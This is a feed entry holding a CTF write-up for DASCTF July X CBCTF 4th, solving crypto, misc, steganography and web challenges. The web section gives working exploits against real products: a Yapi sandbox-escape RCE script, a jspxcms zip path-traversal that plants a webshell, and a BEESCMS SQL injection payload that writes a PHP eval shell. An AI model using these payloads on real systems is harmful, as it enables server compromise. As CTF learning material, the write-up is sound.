    <category term="pwn" scheme="https://lazzzaro.github.io/categories/pwn/"/>
    
    
    <category term="栈" scheme="https://lazzzaro.github.io/tags/%E6%A0%88/"/>
    
  </entry>
  
  <entry>
    <title>2021DASCTF July X CBCTF 4th</title>
    <link href="https://lazzzaro.github.io/2021/08/01/match-2021DASCTF-July-X-CBCTF-4th/"/>
    <id>https://lazzzaro.github.io/2021/08/01/match-2021DASCTF-July-X-CBCTF-4th/</id>
    <published>2021-08-01T10:13:02.000Z</published>
    <updated>2021-08-02T15:57:40.821Z</updated>
    
    <content type="html"><![CDATA[<p>​    </p><p>2021 DASCTF实战精英夏令营预热赛<br>DASCTF July x CBCTF 4th<br>主办单位: 安恒信息、杭州电子科技大学网络空间安全学院<br>竞赛时间: 2021年7月31日10:00- 2021年8月1日18:00<br>报名时间: 2021年7月15日10:00-2021年7月31日10:00<br>报名地址: <a href="https://buuoj.cn/das">https://buuoj.cn/das</a><br>报名方式: 登录后点击[个人信息]完善个人信息&gt;点击[参与情况]创建战队-&gt;分享战队Token给自己的队员-&gt;等待比赛开始<br>竞赛方式: 团队赛(最多三人一组)<br>命题战队: 0rays </p><p>Rank: 42</p><hr><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="Yusa的密码学签到——BlockTrick"><a href="#Yusa的密码学签到——BlockTrick" class="headerlink" title="Yusa的密码学签到——BlockTrick"></a>Yusa的密码学签到——BlockTrick</h3><blockquote><p>好久不见，上课前先签个到叭！此题 nc 连接。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pad</span>(<span class="params">a</span>):</span></span><br><span class="line">size = (<span class="number">16</span>-<span class="built_in">len</span>(a)%<span class="number">16</span>)%<span class="number">16</span></span><br><span class="line">a += <span class="built_in">chr</span>(size)*size</span><br><span class="line"><span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line">iv = os.urandom(<span class="number">16</span>)</span><br><span class="line">key = os.urandom(<span class="number">16</span>)</span><br><span class="line">enc = AES.new(key,AES.MODE_CBC,iv)</span><br><span class="line"><span class="built_in">print</span>(iv.encode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">trick = raw_input(<span class="string">&quot;&quot;</span>)</span><br><span class="line">trick = pad(trick.decode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line">cipher = enc.encrypt(trick)</span><br><span class="line"><span class="keyword">if</span> trick == cipher <span class="keyword">and</span> trick != <span class="string">&quot;&quot;</span> :</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line"><span class="built_in">print</span>(f.read())</span><br><span class="line">exit()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="built_in">print</span>(cipher.encode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Try again&quot;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">exit()</span><br></pre></td></tr></table></figure></blockquote><p>AES-CBC模式原理。</p><p>第一次：</p><p>令 <code>P0 = IV</code></p><p><code>C0 = Encrypt(P0 XOR IV) = Encrypt(0)</code></p><p>第二次：</p><p>令 <code>P1 = C0</code></p><p><code>C1 = Encrypt(P1 XOR C0) = Encrypt(C0 XOR C0) = Encrypt(0) = C0 = P1</code></p><p>​    </p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="red-vs-blue"><a href="#red-vs-blue" class="headerlink" title="red_vs_blue"></a>red_vs_blue</h3><blockquote><p>红队和蓝队将开展66轮对抗，你能预测出每轮对抗的结果吗？</p><p>nc连接</p></blockquote><p>同一次连接内，错误可以反复从头猜，66次随机结果不变，存储之前猜对的正确结果，错误时再重猜当前次数的另一种结果即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29203</span>)</span><br><span class="line">r.recvline()</span><br><span class="line">r.recvline()</span><br><span class="line">r.recvline()</span><br><span class="line">ans=[<span class="string">&#x27;?&#x27;</span>]*<span class="number">67</span></span><br><span class="line"></span><br><span class="line">i=<span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> i&lt;=<span class="number">66</span>:</span><br><span class="line"><span class="built_in">print</span>(r.recvline())</span><br><span class="line">r.recvline()</span><br><span class="line"><span class="keyword">if</span> ans[i]==<span class="string">&#x27;?&#x27;</span>:</span><br><span class="line">r.sendline(<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">r.recvline()</span><br><span class="line">r.recvline()</span><br><span class="line">x=r.recvline()</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;success&#x27;</span> <span class="keyword">in</span> x:</span><br><span class="line">ans[i]=<span class="string">&#x27;r&#x27;</span></span><br><span class="line">i+=<span class="number">1</span></span><br><span class="line"><span class="keyword">elif</span> <span class="string">&#x27;Sorry&#x27;</span> <span class="keyword">in</span> x:</span><br><span class="line">ans[i]=<span class="string">&#x27;b&#x27;</span></span><br><span class="line">r.sendlineafter(<span class="string">&#x27;Play again? (y/n): &#x27;</span>,<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">i=<span class="number">1</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">r.sendline(ans[i])</span><br><span class="line">r.recvline()</span><br><span class="line">r.recvline()</span><br><span class="line">r.recvline()</span><br><span class="line">i+=<span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(ans)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(r.recvall())</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="funny-maze"><a href="#funny-maze" class="headerlink" title="funny_maze"></a>funny_maze</h3><blockquote><p>七月被困在了迷宫里，十秒后迷宫的终点就要永远消失了，你能帮她走出迷宫吗？</p><p>nc 连接</p></blockquote><p>DFS算法走迷宫。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27139</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_sol</span>(<span class="params">maze</span>):</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(path) &gt; <span class="number">0</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>.join(<span class="string">&#x27;&#x27;</span>.join(row) <span class="keyword">for</span> row <span class="keyword">in</span> maze))</span><br><span class="line">solution = <span class="string">&#x27;&#x27;</span>.join(path)[::-<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(solution)</span><br><span class="line"><span class="keyword">global</span> path</span><br><span class="line">path = []</span><br><span class="line"><span class="keyword">return</span> solution</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dfs</span>(<span class="params">maze, y, x</span>):</span></span><br><span class="line"><span class="keyword">if</span> maze[y][x] <span class="keyword">in</span> (<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;S&#x27;</span>):</span><br><span class="line">tag = <span class="string">&#x27;o&#x27;</span></span><br><span class="line">maze[y][x] = tag</span><br><span class="line"><span class="keyword">if</span> dfs(maze, y, x+<span class="number">1</span>) == <span class="literal">True</span>:</span><br><span class="line">tag = <span class="string">&#x27;R&#x27;</span></span><br><span class="line">path.append(tag)</span><br><span class="line"><span class="keyword">elif</span> dfs(maze, y+<span class="number">1</span>, x) == <span class="literal">True</span>:</span><br><span class="line">tag = <span class="string">&#x27;D&#x27;</span></span><br><span class="line">path.append(tag)</span><br><span class="line"><span class="keyword">elif</span> dfs(maze, y, x-<span class="number">1</span>) == <span class="literal">True</span>:</span><br><span class="line">tag = <span class="string">&#x27;L&#x27;</span></span><br><span class="line">path.append(tag)</span><br><span class="line"><span class="keyword">elif</span> dfs(maze, y-<span class="number">1</span>, x) == <span class="literal">True</span>:</span><br><span class="line">tag = <span class="string">&#x27;U&#x27;</span></span><br><span class="line">path.append(tag)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">tag = <span class="string">&#x27; &#x27;</span></span><br><span class="line">maze[y][x] = tag</span><br><span class="line"><span class="keyword">return</span> (tag != <span class="string">&#x27; &#x27;</span>)</span><br><span class="line"><span class="keyword">elif</span> maze[y][x] == <span class="string">&#x27;E&#x27;</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">p.recvline()</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">maze = []</span><br><span class="line"></span><br><span class="line">first = p.recvline().strip()</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;#&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> first:</span><br><span class="line"><span class="built_in">print</span>(first)</span><br><span class="line"><span class="built_in">print</span>(p.recvall())</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">leng = <span class="built_in">len</span>(first)</span><br><span class="line">maze.append(<span class="built_in">list</span>(first))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(leng-<span class="number">1</span>):</span><br><span class="line">now = p.recvline().strip()</span><br><span class="line">maze.append(<span class="built_in">list</span>(now))</span><br><span class="line"></span><br><span class="line">start = []</span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(maze)):</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(maze[y])):</span><br><span class="line"><span class="keyword">if</span> maze[y][x] == <span class="string">&#x27;S&#x27;</span>:</span><br><span class="line">start = [y,x]</span><br><span class="line"></span><br><span class="line">path = []</span><br><span class="line">dfs(maze, start[<span class="number">0</span>], start[<span class="number">1</span>])</span><br><span class="line">sol = get_sol(maze)</span><br><span class="line"><span class="built_in">print</span>(sol)</span><br><span class="line"></span><br><span class="line">p.recvline()</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="built_in">len</span>(sol)+<span class="number">1</span>))</span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="ezSteganography"><a href="#ezSteganography" class="headerlink" title="ezSteganography"></a>ezSteganography</h3><blockquote><p>有手就行的隐写</p></blockquote><p>10M+ png图。</p><p>zsteg在G通道发现隐写另一png图，文字只有一半flag：</p><p><img src="/2021/08/01/match-2021DASCTF-July-X-CBCTF-4th/part1.png" alt="part1" style="zoom: 25%;"></p><p>查找QIM算法：</p><blockquote><p>量化索引调制算法(QIM)是一种经典的水印算法，它根据水印信息，把原始载体数据用量化器量化到不同的索引区间，能在获取较高的鲁棒性同时，具有较小嵌入失真。QIM算法能有效抵抗滤波、噪声、剪切等常见攻击。</p></blockquote><p>找到<a href="https://github.com/pl561/QuantizationIndexModulation">具体实现代码</a>，将输入从一维修改为二维图像矩阵：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;Implementation of QIM method from Data Hiding Codes, Moulin and Koetter, 2005&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">HOME = os.environ[<span class="string">&quot;HOME&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">QIM</span>:</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, delta</span>):</span></span><br><span class="line">self.delta = delta</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">embed</span>(<span class="params">self, x, m</span>):</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">x is a vector of values to be quantized individually</span></span><br><span class="line"><span class="string">m is a binary vector of bits to be embeded</span></span><br><span class="line"><span class="string">returns: a quantized vector y</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">x = x.astype(<span class="built_in">float</span>)</span><br><span class="line">d = self.delta</span><br><span class="line">y = np.<span class="built_in">round</span>(x/d) * d + (-<span class="number">1</span>)**(m+<span class="number">1</span>) * d/<span class="number">4.</span></span><br><span class="line"><span class="keyword">return</span> y</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">detect</span>(<span class="params">self, z</span>):</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">z is the received vector, potentially modified</span></span><br><span class="line"><span class="string">returns: a detected vector z_detected and a detected message m_detected</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">shape = z.shape</span><br><span class="line">z = z.flatten()</span><br><span class="line"></span><br><span class="line">m_detected = np.zeros_like(z, dtype=<span class="built_in">float</span>)</span><br><span class="line">z_detected = np.zeros_like(z, dtype=<span class="built_in">float</span>)</span><br><span class="line"></span><br><span class="line">z0 = self.embed(z, <span class="number">0</span>)</span><br><span class="line">z1 = self.embed(z, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">d0 = np.<span class="built_in">abs</span>(z - z0)</span><br><span class="line">d1 = np.<span class="built_in">abs</span>(z - z1)</span><br><span class="line"></span><br><span class="line">gen = <span class="built_in">zip</span>(<span class="built_in">range</span>(<span class="built_in">len</span>(z_detected)), d0, d1)</span><br><span class="line"><span class="keyword">for</span> i, dd0, dd1 <span class="keyword">in</span> gen:</span><br><span class="line"><span class="keyword">if</span> dd0 &lt; dd1:</span><br><span class="line">m_detected[i] = <span class="number">0</span></span><br><span class="line">z_detected[i] = z0[i]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">m_detected[i] = <span class="number">1</span></span><br><span class="line">z_detected[i] = z1[i]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">z_detected = z_detected.reshape(shape)</span><br><span class="line">m_detected = m_detected.reshape(shape)</span><br><span class="line"><span class="keyword">return</span> z_detected, m_detected.astype(<span class="built_in">int</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">random_msg</span>(<span class="params">self, l</span>):</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">returns: a random binary sequence of length l</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">return</span> np.random.choice((<span class="number">0</span>, <span class="number">1</span>), l)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test_qim</span>():</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">tests the embed and detect methods of class QIM</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment">#l = 10000 # binary message length</span></span><br><span class="line">delta = <span class="number">20</span> <span class="comment"># quantization step</span></span><br><span class="line">qim = QIM(delta)</span><br><span class="line"></span><br><span class="line"><span class="comment">#x = np.random.randint(0, 255, l).astype(float) # host sample</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#msg = qim.random_msg(l)</span></span><br><span class="line"><span class="comment">#y = qim.embed(x, msg)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">img = Image.<span class="built_in">open</span>(<span class="string">&#x27;ezSteganography-flag.png&#x27;</span>)</span><br><span class="line">y = np.array(img)</span><br><span class="line"></span><br><span class="line">z_detected, msg_detected = qim.detect(y)</span><br><span class="line">new_img = Image.fromarray(np.uint8(<span class="number">255</span>*msg_detected))</span><br><span class="line">new_img.save(<span class="string">&#x27;part2.png&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#print(x)</span></span><br><span class="line"><span class="comment">#print(msg)</span></span><br><span class="line"><span class="built_in">print</span>(y)</span><br><span class="line"><span class="built_in">print</span>(z_detected)</span><br><span class="line"></span><br><span class="line"><span class="comment">#print(msg)</span></span><br><span class="line"><span class="built_in">print</span>(msg_detected)</span><br><span class="line"><span class="comment">#assert np.allclose(msg, msg_detected) # compare the original and detected messages</span></span><br><span class="line"><span class="comment">#assert np.allclose(y, z_detected) # compare the original and detected vectors</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">test_qim()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">sys.exit(main())</span><br></pre></td></tr></table></figure><p>得到隐写png水印图片：</p><p><img src="/2021/08/01/match-2021DASCTF-July-X-CBCTF-4th/part2.png" alt="part2" style="zoom: 25%;"></p><p>​    </p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="ezrce"><a href="#ezrce" class="headerlink" title="ezrce"></a>ezrce</h3><blockquote><p>你真的会 nodejs 吗？</p></blockquote><p><a href="https://www.secpulse.com/archives/162502.html">Yapi远程命令执行漏洞</a>。</p><p>注册并登录账号，添加项目，选择设置，设置全局mock脚本：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> sandbox = <span class="built_in">this</span></span><br><span class="line"><span class="keyword">const</span> ObjectConstructor = <span class="built_in">this</span>.constructor</span><br><span class="line"><span class="keyword">const</span> FunctionConstructor = ObjectConstructor.constructor</span><br><span class="line"><span class="keyword">const</span> myfun = FunctionConstructor(<span class="string">&#x27;return process&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> process = myfun()</span><br><span class="line">mockJson = process.mainModule.require(<span class="string">&quot;child_process&quot;</span>).execSync(<span class="string">&quot;whoami&quot;</span>).toString()</span><br></pre></td></tr></table></figure><p>打开脚本，添加一个接口，访问Mock地址即可成功RCE。</p><p>​    </p><h3 id="jspxcms"><a href="#jspxcms" class="headerlink" title="jspxcms"></a>jspxcms</h3><blockquote><p><a href="http://sdejkwdfnewi3f2jr32d3edfewd.dasctf.node4.buuoj.cn:82/">http://sdejkwdfnewi3f2jr32d3edfewd.dasctf.node4.buuoj.cn:82/</a></p><p>靶机每十分钟重置一次。</p></blockquote><p><a href="https://lockcy.github.io/2019/10/18/%E5%A4%8D%E7%8E%B0jspxcms%E8%A7%A3%E5%8E%8Bgetshell%E6%BC%8F%E6%B4%9E/">Jspxcms解压getshell漏洞</a>。</p><p>参考<a href="https://www.laoliang.net/jsjh/technology/6525.html">信息</a>登录后台<code>/cmscp/index.do</code>，<code>admin/空</code> 弱口令进入后台，在文件管理可上传文件。</p><p>虽然能上传任意文件，但在<code>JspDispatcherFilter.java</code>限制了对jsp文件的访问，但可上传并解压zip文件，因<code>WebFileUploadsController.java</code>里的<code>unzip</code>方法调用了下层方法却没有进行文件名检查，导致可以目录穿透。</p><p>将大马<code>cmd.war</code>打包上传并解压，默认放在<code>\webapps\ROOT\uploads\1\</code>下，再修改文件名为<code>../../../cmd.war</code>即可将<code>cmd.war</code>置于<code>webapps</code>根目录下，可自动解析。</p><p>访问<code>/cmd</code>查看根目录flag。</p><p>​    </p><h3 id="cybercms"><a href="#cybercms" class="headerlink" title="cybercms"></a>cybercms</h3><blockquote><p>赛博CMS，只为安全而生</p><p>Hint: 信息搜集是一个web手必备的技能</p></blockquote><p>下载源码<code>www.zip</code>，在<code>/admin/version.php</code>中发现此为BEESCMS v4.0改的CMS。</p><p>找到后台登录页面存在<a href="https://www.cnblogs.com/yuzly/p/11423384.html">Beescms_v4.0 SQL注入漏洞</a>，不同在于过滤函数除了<code>fl_value</code>和<code>fl_html</code>，还多了个<code>f1_vvv</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fl_value</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$str</span>))&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="keyword">return</span> preg_replace(<span class="string">&#x27;/select|insert | update | and | in | on | left | joins | delete |\%|\=|\.\.\/|\.\/| union | from | where | group | into |load_file</span></span><br><span class="line"><span class="string">|outfile/i&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line">define(<span class="string">&#x27;INC_BEES&#x27;</span>,<span class="string">&#x27;B&#x27;</span>.<span class="string">&#x27;EE&#x27;</span>.<span class="string">&#x27;SCMS&#x27;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fl_html</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> htmlspecialchars(<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f1_vvv</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$str</span>))&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/\ /i&quot;</span>, <span class="variable">$str</span>))&#123;</span><br><span class="line"><span class="keyword">exit</span>(<span class="string">&#x27;Go away,bad hacker!!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">preg_replace(<span class="string">&#x27;/0x/i&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$str</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>fl_value</code>过滤关键字，可双写绕过；</p><p><code>f1_html</code>中<code>htmlspecialchars</code>只对双引号编码，可用单引号绕过；</p><p><code>f1_vvv</code>中过滤空格和<code>0x</code>，空格可注释绕过，<code>0x</code>双写绕过。</p><p>payload:</p><p><code>user=-1&#39;/**/uni union on/**/selselectect/**/00xx3c3f70687020406576616c28245f504f53545b636d645d293b3f3e,2,3,4,5/**/int into o/**/outoutfilefile/**/&#39;/var/www/html/2.php&#39;%23&amp;password=ss&amp;code=&amp;submit=true&amp;submit.x=46&amp;submit.y=24</code></p><p>写入shell，蚁剑连接，根目录找到flag。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    &lt;/p&gt;
